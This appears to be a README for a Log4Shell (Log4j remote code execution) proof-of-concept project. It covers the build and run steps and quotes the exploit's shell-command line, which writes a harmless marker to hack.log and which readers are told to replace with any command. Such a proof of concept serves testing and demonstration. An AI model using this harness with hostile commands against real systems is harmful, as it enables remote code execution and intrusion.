### Build
`./build.sh`

### Start log4j RCE Server
`./start-log4j-rce-server.sh`

### Test
- Run `java -cp log4j-rce-1.0-SNAPSHOT-all.jar log4j`
Check if you get logs in hack.log from current folder
- You can change this line  
`String[] cmds = { "sh", "-c", "echo 'Exploit at '" + getDateString() + " >> ./hack.log" };`  
in file `apache-log4j-poc/src/main/java/Exploit.java`
to whatever you like then rebuild and run test
- Check out [issue #1](https://github.com/jeffli1024/log4j-rce-test/issues/1) if you see maven compile error
 
### Credits
- https://github.com/tangxiaofeng7/apache-log4j-poc.git
- https://github.com/mbechler/marshalsec.git
